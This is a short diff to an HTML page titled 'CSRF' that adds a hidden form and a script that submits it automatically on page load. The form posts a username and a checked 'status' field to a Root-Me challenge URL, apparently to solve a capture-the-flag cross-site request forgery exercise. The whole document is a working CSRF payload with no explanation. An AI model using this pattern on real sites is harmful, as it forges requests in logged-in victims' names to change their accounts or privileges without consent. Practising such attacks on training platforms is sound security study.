@@ -4,8 +4,15 @@
     <meta charset="utf-8">
     <title>CSRF</title>
   </head>
-  <body>
-    <h1>JeeJ</h1>
-  </body>
-</html>
 
+  <body>
+    <form name="CSRF" method="post" action="http://challenge01.root-me.org/web-client/ch22/index.php?action=profile">
+      <input type="text" name="username" value="user">
+      <input type="checkbox" name="status" checked="">
+    </form>
+    <script>
+      document.CSRF.submit()
+    </script>
+  </body>
+
+</html>
